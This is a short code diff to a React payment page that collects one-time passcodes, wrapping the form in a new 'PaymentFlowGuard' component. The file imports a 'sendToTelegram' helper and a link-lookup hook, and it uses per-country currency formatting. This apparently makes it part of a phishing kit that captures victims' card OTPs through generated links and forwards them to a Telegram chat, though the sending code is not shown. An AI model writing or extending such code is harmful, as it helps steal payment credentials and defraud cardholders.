@@ -11,8 +11,9 @@ import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import PaymentFlowGuard from "@/components/PaymentFlowGuard";
 
-const PaymentOTPForm = () => {
+const PaymentOTPFormContent = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
@@ -412,5 +413,12 @@ const PaymentOTPForm = () => {
     </DynamicPaymentLayout>
   );
 };
+
+// Wrapper with BOTH flows allowed (OTP is final step for both)
+const PaymentOTPForm = () => (
+  <PaymentFlowGuard allowedFlow="both">
+    <PaymentOTPFormContent />
+  </PaymentFlowGuard>
+);
 
 export default PaymentOTPForm;
